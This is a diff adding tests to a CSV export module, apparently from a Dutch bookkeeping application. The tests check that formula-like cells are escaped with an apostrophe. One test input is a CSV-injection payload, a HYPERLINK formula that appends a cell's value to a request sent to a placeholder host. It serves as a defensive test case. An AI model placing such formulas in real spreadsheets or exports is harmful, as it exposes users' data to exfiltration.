@@ -43,3 +43,19 @@ def test_the_response_is_a_download():
     response = csv_response("jaaroverzicht-2026.csv", ["a"], [[Amount(1)]])
     assert response["Content-Type"] == "text/csv; charset=utf-8"
     assert response["Content-Disposition"] == 'attachment; filename="jaaroverzicht-2026.csv"'
+
+
+@pytest.mark.parametrize(
+    "text",
+    ['=HYPERLINK("http://example.invalid/?"&A1;"x")', "+31 6 1234", "-korting", "@SUM(A1)"],
+)
+def test_text_that_a_spreadsheet_would_run_as_a_formula_is_kept_as_text(text):
+    # Supplier names and descriptions can come from an import: a cell that
+    # starts like a formula gets a ' in front, so Excel shows it as text.
+    line = csv_bytes(["omschrijving"], [[text]]).decode("utf-8-sig").splitlines()[1]
+    assert line.lstrip('"').startswith("'" + text[0])
+
+
+def test_amounts_and_plain_text_are_left_alone():
+    line = csv_bytes(["a", "b"], [[Amount(-500), "Koffie"]]).decode("utf-8-sig").splitlines()[1]
+    assert line == "-5,00;Koffie"
